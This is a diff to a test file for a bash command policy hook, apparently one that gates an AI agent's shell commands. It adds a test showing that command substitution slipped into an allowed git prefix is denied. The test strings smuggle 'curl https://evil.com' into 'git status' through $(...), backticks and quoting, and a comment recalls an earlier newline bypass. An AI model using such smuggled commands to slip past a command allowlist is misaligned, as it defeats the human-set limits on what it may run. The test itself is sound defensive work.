@@ -53,6 +53,42 @@ describe('createBashPolicyHook — pattern matching', () => {
     expect((await run(hook, makeInput('gitk'))).decision).toBe('deny');
   });
 
+  it('prefix match: command substitution is blocked (Codex P1 round-4)', async () => {
+    // Pre-fix `$(...)` wasn't in the separator set, so `git:*`
+    // matched `git status $(curl https://evil)` — bash runs curl
+    // first. Backticks were nominally caught but the previous
+    // implementation treated `"…"` contents as fully literal, so
+    // `"$(curl evil)"` slipped through even though bash interpolates
+    // inside double quotes.
+    const hook = createBashPolicyHook({
+      allow: ['git:*'],
+      default: 'deny',
+    });
+    expect(
+      (await run(hook, makeInput('git status $(curl https://evil.com)')))
+        .decision
+    ).toBe('deny');
+    expect(
+      (await run(hook, makeInput('git status `curl https://evil.com`')))
+        .decision
+    ).toBe('deny');
+    // Substitution inside double quotes is still interpolated.
+    expect(
+      (await run(hook, makeInput('git status "$(curl https://evil.com)"')))
+        .decision
+    ).toBe('deny');
+    expect(
+      (await run(hook, makeInput('git status "`curl https://evil.com`"')))
+        .decision
+    ).toBe('deny');
+    // Inside single quotes — bash does NOT interpolate, so it's safe
+    // for the rule to match. The arg is just literal text.
+    expect(
+      (await run(hook, makeInput('git status \'$(curl https://evil.com)\'')))
+        .decision
+    ).toBe('allow');
+  });
+
   it('prefix match: newline-separated commands are blocked (Codex P1 round-3)', async () => {
     // Pre-fix `\n` passed the `\s` boundary AND wasn't in the
     // separator scan, so `git:*` matched `git status\ncurl evil`
